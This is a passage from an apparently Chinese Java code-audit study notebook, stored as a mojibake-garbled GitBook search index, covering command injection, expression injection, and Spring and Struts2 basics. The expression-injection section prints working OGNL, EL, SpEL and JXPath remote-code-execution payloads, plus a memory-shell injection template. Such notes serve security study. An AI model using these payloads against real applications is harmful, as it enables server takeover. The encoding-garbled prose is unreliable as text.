xxx>test.txtâ€ï¼Œä¼šè¢«åˆ†å‰²ä¼šâ€echoâ€å’Œâ€xxx>test.txtâ€ï¼Œç„¶åç¬¬ä¸€éƒ¨åˆ†çš„â€echoâ€ä¼šè¢«å½“æˆå¯åŠ¨çš„æ‰§è¡Œæ¨¡å—ï¼Œç„¶è€Œåœ¨windowçš„ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­æ˜¯æ‰¾ä¸åˆ°è¿™ä¸ªå¯åŠ¨æ¨¡å—çš„ï¼ˆå¯ä»¥åœ¨cmdä¸­è¾“å…¥å‘½ä»¤â€œwhere echoâ€è¿›è¡Œæµ‹è¯•ï¼‰,æ‰€ä»¥è¿è¡Œåæ‰ä¼šæŠ›å‡ºâ€œç³»ç»Ÿæ‰¾ä¸åˆ°æŒ‡å®šæ–‡ä»¶â€é”™è¯¯ã€‚ è§£å†³ï¼šwindowsåŠ ä¸Šcmd /cï¼ŒLinuxä½¿ç”¨base64ç¼–ç  ä¿®å¤ä»£ç  ä¸»è¦æ˜¯å› ä¸ºå¯ä»¥é€šè¿‡å‘½ä»¤åˆ†éš”ç¬¦æ¥æ‰§è¡Œå¤šæ¡å‘½ä»¤ è¯¥é¡¹ç›®ä¸­ç»™å‡ºçš„ä¿®å¤æ–¹æ³•ä¸ºé€šè¿‡æ­£åˆ™åªå…è®¸è¾“å…¥å¤§å°å†™å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€æ–œæ ã€ç‚¹å’ŒçŸ­æ¨ªçº¿ private static final Pattern FILTER_PATTERN = Pattern.compile(\"^[a-zA-Z0-9_/\\\\.-]+$\"); public static String cmdFilter(String input) { if (!FILTER_PATTERN.matcher(input).matches()) { return null; } return input; } Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 21:17:01 "},"03.ä»£ç å®¡è®¡/JAVA/02.åŸºç¡€æ¼æ´/æ¨¡æ¿æ³¨å…¥.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/02.åŸºç¡€æ¼æ´/æ¨¡æ¿æ³¨å…¥.html","title":"æ¨¡æ¿æ³¨å…¥","keywords":"","body":"Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-26 15:37:53 "},"03.ä»£ç å®¡è®¡/JAVA/02.åŸºç¡€æ¼æ´/è¡¨è¾¾å¼æ³¨å…¥.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/02.åŸºç¡€æ¼æ´/è¡¨è¾¾å¼æ³¨å…¥.html","title":"è¡¨è¾¾å¼æ³¨å…¥","keywords":"","body":" ä»€ä¹ˆæ˜¯è¡¨è¾¾å¼å‘¢ï¼Ÿå…¶å®é€šä¿—çš„è¯´å°±æ˜¯ä¸€ä¸ªå¸®åŠ©æˆ‘ä»¬æ›´æ–¹ä¾¿æ“ä½œBeanç­‰å¯¹è±¡çš„å¼å­ // æ­£å¸¸Javaä»£ç  String name = MyUser.getName() // è¡¨è¾¾å¼å†™æ³• #MyUser.name OGNL https://j0k3r.top/2020/08/19/java-ognl/#0x01-OGNL-Object-Graph-Navigation-Library struct2é€šè¿‡ognlè¡¨è¾¾å¼æ¥æ‰§è¡Œå‘½ä»¤ Expression è¡¨è¾¾å¼ root æ ¹å¯¹è±¡ï¼Œå³æ“ä½œå¯¹è±¡ context ä¸Šä¸‹æ–‡ï¼Œç”¨æ¥ä¿å­˜å¯¹è±¡è¿è¡Œçš„å±æ€§åŠå…¶å€¼ï¼Œæœ‰ç‚¹ç±»ä¼¼äºè¿è¡Œç¯å¢ƒçš„æ„æ€ï¼Œä¿å­˜äº†ç¯å¢ƒå˜é‡ Demo Hacker hacker = new Hacker(); hacker.setName(\"hacker\"); // åˆ›å»ºContextå¹¶ä¼ å…¥root OgnlContext context = new OgnlContext(); context.setRoot(hacker) // åˆ›å»ºExpression String expression = \"hacker.name\"; Object ognl = Ognl.parseExpression(expression); // è°ƒç”¨ Object value = Ognl.getValue(ognl,context,context.getRoot()); System.out.println(\"result:\" + value); rce // åˆ›å»ºä¸€ä¸ªOGNLä¸Šä¸‹æ–‡å¯¹è±¡ OgnlContext context = new OgnlContext(); // getValue() è§¦å‘ // @[ç±»å…¨å(åŒ…æ‹¬åŒ…è·¯å¾„)]@[æ–¹æ³•å|å€¼å] Ognl.getValue(\"@java.lang.Runtime@getRuntime().exec('/Applications/Calculator.app/Contents/MacOS/Calculator')\", context, context.getRoot()); // getValue() ä½¿ç”¨ new Ognl.getValue(\"(new java.lang.ProcessBuilder(new java.lang.String[]{\\\"/Applications/Calculator.app/Contents/MacOS/Calculator\\\"}).start())\", context, context.getRoot()); // setValue() è§¦å‘ Ognl.setValue(\"(\\\"@java.lang.Runtime@getRuntime().exec(\\'/Applications/Calculator.app/Contents/MacOS/Calculator\\')\\\")(a)(b)\",context,\"\"); EL ELè¡¨è¾¾å¼å¯ä»¥åœ¨JSPæˆ–JSFé¡µé¢ä¸­ç›´æ¥åµŒå…¥ï¼Œä»¥ä¾¿æ›´æ–¹ä¾¿åœ°è·å–å’Œæ“ä½œJavaå¯¹è±¡çš„æ•°æ®ã€‚ execä¸€å¥è¯å›æ˜¾ ${pageContext.setAttribute(\"inputStream\", Runtime.getRuntime().exec(\"cmd /c dir\").getInputStream());Thread.sleep(1000);pageContext.setAttribute(\"inputStreamAvailable\", pageContext.getAttribute(\"inputStream\").available());pageContext.setAttribute(\"byteBufferClass\", Class.forName(\"java.nio.ByteBuffer\"));pageContext.setAttribute(\"allocateMethod\", pageContext.getAttribute(\"byteBufferClass\").getMethod(\"allocate\", Integer.TYPE));pageContext.setAttribute(\"heapByteBuffer\", pageContext.getAttribute(\"allocateMethod\").invoke(null, pageContext.getAttribute(\"inputStreamAvailable\")));pageContext.getAttribute(\"inputStream\").read(pageContext.getAttribute(\"heapByteBuffer\").array(), 0, pageContext.getAttribute(\"inputStreamAvailable\"));pageContext.setAttribute(\"byteArrType\", pageContext.getAttribute(\"heapByteBuffer\").array().getClass());pageContext.setAttribute(\"stringClass\", Class.forName(\"java.lang.String\"));pageContext.setAttribute(\"stringConstructor\", pageContext.getAttribute(\"stringClass\").getConstructor(pageContext.getAttribute(\"byteArrType\")));pageContext.setAttribute(\"stringRes\", pageContext.getAttribute(\"stringConstructor\").newInstance(pageContext.getAttribute(\"heapByteBuffer\").array()));pageContext.getAttribute(\"stringRes\")} jsEngine å›æ˜¾ ${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"var+s=[3];s[0]=\\\"cmd\\\";s[1]=\\\"/c\\\";s[2]=\\\"whoami\\\";var+p=java.lang.Runtime.getRuntime().exec(s);var+sc=new+java.util.Scanner(p.getInputStream(),\\\"GBK\\\").useDelimiter(\\\"\\\\\\\\A\\\");var+result=sc.hasNext()?sc.next():\\\"\\\";sc.close();result;\")} SPEL https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/ ä¸“é—¨ç”¨äºspringæ¡†æ¶çš„ELè¡¨è¾¾å¼ RCE String cmdStr = \"new java.lang.ProcessBuilder(new String[]{\\\"calc\\\"}).start()\"; ExpressionParser parser = new SpelExpressionParser();//åˆ›å»ºè§£æå™¨ Expression exp = parser.parseExpression(cmdStr);//è§£æè¡¨è¾¾å¼ System.out.println( exp.getValue() );//å¼¹å‡ºè®¡ç®—å™¨ // T()æ“ä½œç¬¦ä¼šè¿”å›ä¸€ä¸ªobject , å®ƒå¯ä»¥å¸®åŠ©æˆ‘ä»¬è·å–æŸä¸ªç±»çš„é™æ€æ–¹æ³• , ç”¨æ³•T(å…¨é™å®šç±»å).æ–¹æ³•å() String cmdStr = \"T(java.lang.Runtime).getRuntime().exec('calc')\"; ExpressionParser parser = new SpelExpressionParser();//åˆ›å»ºè§£æå™¨ Expression exp = parser.parseExpression(cmdStr);//è§£æè¡¨è¾¾å¼ System.out.println( exp.getValue() );//å¼¹å‡ºè®¡ç®—å™¨ String cmdStr = \"T(javax.script.ScriptEngineManager).getEngineByName(\\\"nashorn\\\").eval(\\\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\\\")\"; ExpressionParser parser = new SpelExpressionParser();//åˆ›å»ºè§£æå™¨ Expression exp = parser.parseExpression(cmdStr);//è§£æè¡¨è¾¾å¼ System.out.println( exp.getValue() );//å¼¹å‡ºè®¡ç®—å™¨ å†…å­˜é©¬æ³¨å…¥ T(org.springframework.cglib.core.ReflectUtils).defineClass('InceptorMemShell',T(org.springframework.util.Base64Utils).decodeFromString('base64å†…å­˜é©¬'),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance() JXPATH JXPathæ”¯æŒæ ‡å‡†çš„XPathå‡½æ•°ï¼Œå¼€ç®±å³ç”¨ã€‚å®ƒè¿˜æ”¯æŒ \"æ ‡å‡† \"æ‰©å±•å‡½æ•°ï¼Œè¿™äº›å‡½æ•°åŸºæœ¬ä¸Šæ˜¯é€šå¾€Javaçš„æ¡¥æ¢ï¼Œä»¥åŠå®Œå…¨è‡ªå®šä¹‰çš„æ‰©å±•å‡½æ•°. String firstName = (String)context.getValue(\"getAuthorsFirstName($book)\"); //å®˜æ–¹demoï¼Œç­‰ä»·äºè°ƒç”¨$book.getAuthorsFirstName()æ–¹æ³• å¦‚æœæˆ‘ä»¬æƒ³è¦æ‰§è¡Œ Runtime.getRuntime().exec(\"open -na Calculator\") æŒ‰ç…§ä¸Šé¢çš„ä¾‹å­å…¶å®å°±æ”¹ä¸ºäº† exec(java.lang.Runtime.getRuntime(),'open -na Calculator') GeoServer å±æ€§åè¡¨è¾¾å¼å‰å°ä»£ç æ‰§è¡Œpayload exec(java.lang.Runtime.getRuntime(),'touch /tmp/success2') JEXL Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-26 15:45:25 "},"03.ä»£ç å®¡è®¡/JAVA/03.JavaWebäº†è§£/Spring.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/03.JavaWebäº†è§£/Spring.html","title":"Spring","keywords":"","body":"SSMï¼ˆSpringMVC + Spring + MyBatisï¼‰ SpringMVCä»£æ›¿Struts2 MyBatisä»£æ›¿Hibernate Springå¹¶ä¸æ˜¯ä¸€ä¸ªæ–°çš„webæ¡†æ¶ï¼Œè€Œæ˜¯ä½œè€…è®¤ä¸ºjavaçš„æ¡†æ¶å·²ç»è¶³å¤Ÿå¤šä¸”åŠŸèƒ½å®Œå–„ï¼Œåªéœ€è¦ä¸€ä¸ªâ€œå·¥å…·â€å°†ä»–ä»¬æ•´åˆèµ·æ¥å³å¯ï¼Œå› æ­¤springè¯ç”Ÿäº†ã€‚ Springæœ€é‡è¦çš„ä¸¤ä¸ªæ€æƒ³IOC(DI)å’ŒAOPï¼š IOC(DI)å³æ§åˆ¶åè½¬ï¼ˆä¾èµ–æ³¨å…¥ï¼‰ï¼Œè¿™é‡Œçš„æ§åˆ¶æŒ‡çš„æ˜¯å¯¹ç±»å®ä¾‹åŒ–çš„æ§åˆ¶ï¼Œåè½¬æ˜¯æŒ‡é€šå¸¸ç±»çš„å®ä¾‹åŒ–æ˜¯ç”±å¼€å‘äººå‘˜å®Œæˆçš„ï¼Œç°åœ¨å°†è¿™ä¸ªæƒåˆ©ç»™äºˆå®¹å™¨ï¼ˆè¿™é‡Œå°±æ˜¯springï¼‰ï¼Œå‘Šè¯‰å®¹å™¨å®ä¾‹åŒ–ç±»çš„æ–¹æ³•ï¼Œåœ¨ä½¿ç”¨æ—¶å¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œé™ä½çš„ä»£ç çš„è€¦åˆåº¦å’Œé‡ï¼ŒåŒæ—¶ä¹Ÿå¢åŠ äº†ç¨‹åºçš„å¯è¯»æ€§ã€‚ AOPå³é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼Œç®€å•ç†è§£å°±æ˜¯å°†å„ä¸ªæ¨¡å—å…¬ç”¨çš„æ¨¡å—ï¼ˆå¦‚æ‰“æ—¥å¿—ï¼‰æŠ½å‡ºæ¥ï¼Œä¹Ÿå¯ä»¥é™ä½ä»£ç çš„è€¦åˆåº¦ã€‚ Spring Boot Spring Boot æ˜¯å¯¹ Spring å·¥ä½œæµå±‚é¢çš„æ¼”è¿›ï¼Œå®ç°åŸºäº Spring çš„æ›´ä¾¿æ·çš„ç”Ÿäº§çº§åˆ«åº”ç”¨ã€‚ Spring Boot çš„ä¼˜ç‚¹ï¼š å†…åµŒ Servlet å®¹å™¨ï¼Œç‹¬ç«‹è¿è¡Œçš„ Spring é¡¹ç›®ï¼ŒSpring Boot å¯ä»¥å†…åµŒ Tomcatï¼Œä»¥ java -jar xx.jar åŒ…çš„å½¢å¼æ¥è¿è¡Œä¸€ä¸ª Spring Boot åº”ç”¨ï¼Œçœç•¥äº† war åŒ…éƒ¨ç½²çš„ç¹çã€‚ æä¾› starter æœºåˆ¶ç®€åŒ– Maven ä¾èµ–ç®¡ç†ä¸ Spring é…ç½®ï¼Œå¦‚ä»…éœ€è¦å¼•å…¥â€œspring-boot-starter-webâ€å°±å¯ä»¥åŒ…å« Spring å’Œ SpringMVC ç›¸å…³çš„ä¾èµ–å’Œé…ç½®ã€‚ é¡¹ç›®ç»“æ„ è¿‡æ»¤å™¨ï¼ˆFilterï¼‰å’Œ æ‹¦æˆªå™¨ï¼ˆInterceptor ) çš„åŒºåˆ«_filter_security_interceptor-CSDNåšå®¢ å¦å¤–è¿˜è¦æ³¨æ„POM.xml pom.xmlï¼š Maven æ„å»ºè¯´æ˜æ–‡ä»¶ï¼ˆç®¡ç†é¡¹ç›®ä¾èµ–ï¼‰ spring-booté¡¹ç›®ç‰¹æœ‰çš„æ ‡ç­¾ org.springframework.boot spring-boot-starter-parent 2.2.2.RELEASE æœ‰äº†è¿™ä¸ªï¼Œå½“å‰çš„é¡¹ç›®æ‰æ˜¯ Spring Boot é¡¹ç›®ï¼Œspring-boot-starter-parent æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ starter ï¼Œå®ƒç”¨æ¥æä¾›ç›¸å…³çš„Mavené»˜è®¤ä¾èµ–ã€‚ä½¿ç”¨å®ƒä¹‹åï¼Œå¸¸ç”¨çš„åŒ…ä¾èµ–å°±å¯ä»¥çœå» version æ ‡ç­¾ï¼Œå…³äºå…·ä½“ Spring Boot æä¾›äº†å“ªäº› jar åŒ…çš„ä¾èµ–ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹æœ¬åœ° Maven ä»“åº“ä¸‹ï¼š\\repository\\org\\springframework\\boot\\spring-boot-dependencies\\2.2.2.RELEASE\\spring-boot-dependencies-2.2.2.RELEASE.pom æ–‡ä»¶æ¥æŸ¥çœ‹ æ¯”å¦‚è¯´spring bootå†…ç½®äº†Tomcatä½œä¸ºé»˜è®¤çš„Servletå®¹å™¨ï¼Œ2.2.2ç‰ˆæœ¬å¯¹åº”çš„Tomcatç‰ˆæœ¬ä¸º9.0.29ã€‚ é¡¹ç›®é…ç½®æ–‡ä»¶åœ¨src/main/resourcesç›®å½•ä¸‹ application.propertiesæˆ–è€…application.yml åº”ç”¨å…¥å£ç±» Spring Boot é¡¹ç›®é€šå¸¸æœ‰ä¸€ä¸ªåä¸º Application çš„å…¥å£ç±»ï¼Œå…¥å£ç±»é‡Œæœ‰ä¸€ä¸ª main æ–¹æ³•ï¼Œ *è¿™ä¸ª main æ–¹æ³•å…¶å®å°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ Java åº”ç”¨çš„å…¥å£æ–¹æ³•ã€‚ è¯·æ±‚ä¼ é€’æµç¨‹ ä¸ºäº†æ›´å¥½ç†è§£ï¼Œä»¥ã€Œä¿å­˜è®¢å•ã€åŠŸèƒ½ä¸ºä¾‹ï¼Œä¸»è¦çš„è¯·æ±‚æµç¨‹å¦‚ä¸‹å›¾ï¼Œä¸äº†è§£Springè¯·æ±‚ä¼ é€’çš„åŒå­¦å¯ä»¥åœ¨ä»£ç ä¸­è·Ÿä¸€éè¯·æ±‚æµç¨‹ï¼Œä¼šåŠ æ·±è¯·æ±‚ä¼ é€’çš„å°è±¡ã€‚ æ³¨è§£ @SpringBootApplication: ç”¨äºæ ‡è¯†ä¸»ç±»ï¼Œè¡¨æ˜è¿™æ˜¯ä¸€ä¸ª Spring Boot åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚å®ƒç»„åˆäº† @Configurationã€@EnableAutoConfiguration å’Œ @ComponentScan æ³¨è§£ã€‚ @RestController: æ ‡è¯†ä¸€ä¸ªç±»ä¸º RESTful é£æ ¼çš„æ§åˆ¶å™¨ï¼Œç”¨äºå¤„ç† HTTP è¯·æ±‚å¹¶è¿”å›å“åº”ã€‚ @RequestMapping: å®šä¹‰è¯·æ±‚çš„ URL è·¯å¾„ï¼Œå¯ç”¨äºç±»çº§åˆ«æˆ–æ–¹æ³•çº§åˆ«ã€‚ç”¨äºæ˜ å°„ HTTP è¯·æ±‚åˆ°ç›¸åº”çš„æ§åˆ¶å™¨æ–¹æ³•ã€‚ @GetMapping, @PostMapping, @PutMapping, @DeleteMapping: åˆ†åˆ«ç”¨äºæ ‡è¯† GETã€POSTã€PUT å’Œ DELETE è¯·æ±‚çš„å¤„ç†æ–¹æ³•ã€‚ @RequestBody: ç”¨äºå°†è¯·æ±‚ä½“çš„å†…å®¹ç»‘å®šåˆ°æ–¹æ³•å‚æ•°ä¸Šï¼Œé€šå¸¸ç”¨äºæ¥æ”¶ JSON æˆ– XML æ•°æ®ã€‚ @PathVariable: ç”¨äºä» URL è·¯å¾„ä¸­è·å–å˜é‡å€¼ï¼Œå¹¶å°†å…¶ç»‘å®šåˆ°æ–¹æ³•å‚æ•°ä¸Šã€‚ @RequestParam: ç”¨äºè·å–è¯·æ±‚å‚æ•°çš„å€¼ï¼Œå¹¶å°†å…¶ç»‘å®šåˆ°æ–¹æ³•å‚æ•°ä¸Šã€‚ @Autowired: è‡ªåŠ¨è£…é…ä¾èµ–é¡¹ï¼Œé€šè¿‡ç±»å‹æ¥æŸ¥æ‰¾åŒ¹é…çš„ beanï¼Œå¹¶æ³¨å…¥åˆ°å­—æ®µã€æ„é€ å‡½æ•°æˆ–æ–¹æ³•å‚æ•°ä¸­ã€‚ @Value: ç”¨äºå°†å±æ€§å€¼æ³¨å…¥åˆ°å­—æ®µã€æ„é€ å‡½æ•°æˆ–æ–¹æ³•å‚æ•°ä¸­ã€‚ @Configuration: å£°æ˜ä¸€ä¸ªç±»ä½œä¸ºé…ç½®ç±»ï¼Œç”¨äºå®šä¹‰ bean çš„åˆ›å»ºå’Œé…ç½®ã€‚ @Component: æ ‡è¯†ä¸€ä¸ªç±»ä¸º Spring ç»„ä»¶ï¼Œä¼šè¢«è‡ªåŠ¨æ‰«æå¹¶åˆ›å»ºä¸º beanã€‚ @Service: æ ‡è¯†ä¸€ä¸ªç±»ä¸ºæœåŠ¡å±‚ç»„ä»¶ï¼Œé€šå¸¸ç”¨äºæ³¨è§£ä¸šåŠ¡é€»è¾‘çš„å®ç°ç±»ã€‚ @Repository: æ ‡è¯†ä¸€ä¸ªç±»ä¸ºæ•°æ®è®¿é—®å±‚ç»„ä»¶ï¼Œé€šå¸¸ç”¨äºæ³¨è§£æ•°æ®åº“æ“ä½œçš„å®ç°ç±»ã€‚ @EnableAutoConfiguration: å¼€å¯è‡ªåŠ¨é…ç½®åŠŸèƒ½ï¼ŒSpring Boot ä¼šæ ¹æ®é¡¹ç›®çš„ä¾èµ–å’Œé…ç½®è‡ªåŠ¨è¿›è¡Œç›¸åº”çš„é…ç½®ã€‚ @Conditional: æ ¹æ®æ¡ä»¶æ¥å†³å®šæ˜¯å¦åˆ›å»ºæŸä¸ª bean æˆ–æ‰§è¡ŒæŸæ®µä»£ç ã€‚ åœ¨application.ymlä¸­æ·»åŠ  server: port: 8080 servlet: context-path: / name: Khaz age: 18 content: \"name${name},age${age}\" æ–°å»ºHelloControllerç±» @RestController public class HelloController { @Value(\"${age}\") private Integer age; @Value(\"${name}\") private String name; @RequestMapping(value = \"/hello\") public String get(){ return name + \":\"+age; } } @RestControlleræ‰€ä»¥æ•°æ®æ ¼å¼ä¸ºjsonæ ¼å¼ è¿è¡Œjsp ä¾èµ– org.apache.tomcat.embed tomcat-embed-jasper 8.5.28 javax.servlet javax.servlet-api javax.servlet jstl ä¸»æµçš„ç›®å½•ç»“æ„ éå¿…é¡»ï¼Œé…ç½®å¥½è§†å›¾è·¯å¾„å‰ç¼€å³å¯ â””â”€WEBAPP â””â”€WEB-INF â””â”€jsp â””â”€index.jsp é…ç½®è§†å›¾ spring: mvc: view: prefix: /WEB-INF/jsp/ suffix: .jsp prefixéœ€è¦åŠ ä¸Š/ï¼Œè·¯å¾„çš„æ‹¼æ¥ä¸ºå‰ç¼€+è§†å›¾åç§°+åç¼€ï¼š/WEB-INF/jsp/index.jsp æ§åˆ¶ç±» @Controller @RequestMapping(\"web\") public class WebController { @RequestMapping(value = \"index\",method = RequestMethod.GET) public String index(){ return \"index\"; } } é€šè¿‡@Controlleræ³¨è§£å°†WebControllerç±»å£°æ˜ä¸ºSpring MVCçš„æ§åˆ¶å™¨ã€‚ ä½¿ç”¨@RequestMapping(\"web\")æ³¨è§£å°†webä½œä¸ºåŸºæœ¬URLè·¯å¾„ï¼Œè¡¨ç¤ºè¯¥æ§åˆ¶å™¨å¤„ç†ä»¥/webå¼€å¤´çš„è¯·æ±‚ã€‚ åœ¨indexæ–¹æ³•ä¸Šä½¿ç”¨@RequestMapping(value = \"index\", method = RequestMethod.GET)æ³¨è§£æ¥æ˜ å°„å…·ä½“çš„è¯·æ±‚è·¯å¾„ï¼Œå³å¤„ç†ä»¥/web/indexçš„GETè¯·æ±‚ã€‚ æ–¹æ³•è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸² \"index\"ï¼Œè¡¨ç¤ºè¦æ¸²æŸ“åä¸ºindexçš„è§†å›¾ã€‚ è¿è¡Œç»“æœ SpringCloud (äº†è§£å³å¯) å‚è€ƒæ–‡ç«  é€šè¿‡IDEAæ­å»ºspringbooté¡¹ç›®ï¼ˆmavenæ–¹å¼ï¼‰ideaåˆ›å»ºspringboot +mavenæ™ºMinçš„åšå®¢-CSDNåšå®¢ https://congzhou09.github.io/knowledge/Java-web-%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%9E%B6%E6%9E%84%E6%BC%94%E8%BF%9B%E5%8E%86%E5%8F%B2.html Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-18 16:00:56 "},"03.ä»£ç å®¡è®¡/JAVA/03.JavaWebäº†è§£/Struts2.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/03.JavaWebäº†è§£/Struts2.html","title":"Struts 2","keywords":"","body":"SSHï¼ˆStruts2 + Spring + Hibernateï¼‰ Struts2 è§£æï¼šå®¢æˆ·ç«¯å‘é€è¯·æ±‚ï¼ˆHttpServletRequestï¼‰åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚å°±å…ˆè¿›å…¥web.xmlé…ç½®æ–‡ä»¶çœ‹çœ‹æœ‰æ²¡æœ‰é…ç½®è¿‡æ»¤å™¨ï¼Œå‘ç°æœ‰æœ‰Struts2çš„è¿‡æ»¤å™¨ï¼Œç„¶åæ‰¾åˆ°struts.xmlé…ç½®æ–‡ä»¶ï¼Œstruts.xmlé…ç½®æ–‡ä»¶é‡Œå®šä¹‰ä¸€ä¸ªactionï¼Œç„¶åå°±å»æ‰¾åˆ°actionç±»ï¼Œæ­¤ç±»ç»§æ‰¿ActionSupportæ¥å£ï¼Œå¹¶ä¸”å®ç°äº†execute()æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²â€œsuccessâ€ç»™struts.xmlé…ç½®æ–‡ä»¶ï¼Œstruts.xmlé…ç½®æ–‡ä»¶çš„actionä¼šé»˜è®¤è°ƒç”¨actionç±»çš„execute()æ–¹æ³•ï¼Œresultæ¥æ”¶åˆ°è¿”å›çš„å­—ç¬¦ä¸²ï¼Œresultå°±ä¼šè°ƒç”¨ä½ æŒ‡å®šçš„jspé¡µé¢å°†ç»“æœå‘ˆç°ï¼Œæœ€åå“åº”ç»™å®¢æˆ·ç«¯ã€‚ Spring Hibernate Hibernateæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„å¯¹è±¡å…³ç³»æ˜ å°„æ¡†æ¶ï¼Œå®ƒå¯¹JDBCè¿›è¡Œäº†éå¸¸è½»é‡çº§çš„å¯¹è±¡å°è£…ï¼Œå®ƒå°†POJOä¸æ•°æ®åº“è¡¨å»ºç«‹æ˜ å°„å…³ç³»ï¼Œæ˜¯ä¸€ä¸ªå…¨è‡ªåŠ¨çš„ormæ¡†æ¶ã€‚ WEB-INF/web.xml struts2 org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter struts2 /* WEB-INF/classes/struts.xml /jsp/success.jsp /jsp/error.jsp åœ¨actionæ ‡ç­¾ä¸­å®šä¹‰äº†nameå’Œclassã€‚nameå±æ€§å¯¹åº”çš„æ˜¯ç”¨æˆ·URLè¯·æ±‚ä¸­çš„actionåï¼Œclasså±æ€§æ˜¯å¤„ç†è¯·æ±‚çš„å®ç°ç±»ï¼ˆæ³¨æ„ï¼šè¦åŒ…å«å®Œæ•´è·¯å¾„ï¼‰ã€‚ resultæ ‡ç­¾å®šä¹‰é€»è¾‘è§†å›¾å’Œç‰©ç†è§†å›¾ä¹‹é—´çš„æ˜ å°„ï¼Œåœ¨æˆ‘ä»¬çš„Actionä¸­ï¼Œå¦‚æœè¿”å›çš„å­—ç¬¦ä¸²æ˜¯\"successâ€åˆ™ç”±å¯¹åº”çš„success.jspé¡µé¢è¿›è¡Œå¤„ç†ï¼›å¦‚æœè¿”å›çš„å­—ç¬¦ä¸²æ˜¯\"errorâ€åˆ™ç”±error.jspé¡µé¢è¿›è¡Œå¤„ç†ã€‚ src/com.cy.action package com.cy.action; import com.opensymphony.xwork2.ActionSupport; public class LoginAction extends ActionSupport { private static final long serialVersionUID = 1L; private String userName; private String password; public String execute() { if (userName.equals(\"hellokitty\") && password.equals(\"123\")) { return SUCCESS; } else { return ERROR; } } public String getUserName() { return userName; } public void setUserName(String userName) { this.userName = userName; } public String getPassword() { return password; } public void setPassword(String password) { this.password = password; } } Struts2ç›´æ¥ä½¿ç”¨Actionæ¥å°è£…HTTPè¯·æ±‚å‚æ•°ï¼Œå› æ­¤Actionç±»åº”è¯¥åŒ…å«ä¸è¯·æ±‚ç›¸å¯¹åº”çš„å±æ€§ï¼Œå¹¶ä¸ºè¯¥å±æ€§æä¾›å¯¹åº”çš„setterå’Œgetteræ–¹æ³•ã€‚ ä¸ºActionç±»é‡Œå¢åŠ ä¸€ä¸ªexecuteæ–¹æ³•ï¼Œå› ä¸ºStruts2æ¡†æ¶é»˜è®¤ä¼šæ‰§è¡Œè¿™ä¸ªæ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•æœ¬èº«å¹¶ä¸åšä¸šåŠ¡é€»è¾‘å¤„ç†ï¼Œè€Œæ˜¯è°ƒç”¨å…¶ä»–ä¸šåŠ¡é€»è¾‘ç»„ä»¶å®Œæˆè¿™éƒ¨åˆ†å·¥ä½œã€‚ Actionç±»è¿”å›ä¸€ä¸ªæ ‡å‡†çš„å­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªé€»è¾‘è§†å›¾åï¼Œè¯¥è§†å›¾åå¯¹åº”å®é™…çš„ç‰©ç†è§†å›¾ã€‚ WebRoot/jsp/login.jsp \"> My JSP 'Login.jsp' starting page --> ç”¨æˆ·åï¼š å¯†&nbsp;&nbsp;&nbsp;&nbsp;ç : 1ï¼‰é¦–å…ˆå®¢æˆ·ç«¯æµè§ˆå™¨å‘é€ä¸€ä¸ªè¯·æ±‚ï¼ˆHttpServletRequestï¼‰ã€‚ 2ï¼‰æ¥ç€ç¨‹åºä¼šè°ƒç”¨ StrutsPrepareAndExecuteFilterï¼Œç„¶åè¯¢é—® ActionMapper è¿™ä¸ªè¯·æ±‚æ˜¯å¦éœ€è¦è°ƒç”¨æŸä¸ª Actionã€‚ 3ï¼‰å¦‚æœ ActionMapper å†³å®šéœ€è¦è°ƒç”¨æŸä¸ª Actionï¼ŒStrutsPrepareAndExecuteFilter ä¼šæŠŠè¯·æ±‚çš„å¤„ç†äº¤ç»™ ActionProxyã€‚ 4ï¼‰ActionProxy é€šè¿‡é…ç½®ç®¡ç†å™¨ï¼ˆConfiguration Managerï¼‰ä»é…ç½®æ–‡ä»¶ï¼ˆstruts.xmlï¼‰ä¸­è¯»å–æ¡†æ¶çš„é…ç½®ä¿¡æ¯ï¼Œä»è€Œæ‰¾åˆ°éœ€è¦è°ƒç”¨çš„ Action ç±»ã€‚ 5ï¼‰ActionProxy ä¼šåˆ›å»ºä¸€ä¸ª ActionInvocation çš„å®ä¾‹ã€‚ 6ï¼‰ActionInvocation ä½¿ç”¨å‘½åæ¨¡å¼è°ƒç”¨ Actionï¼Œåœ¨è°ƒç”¨ Action 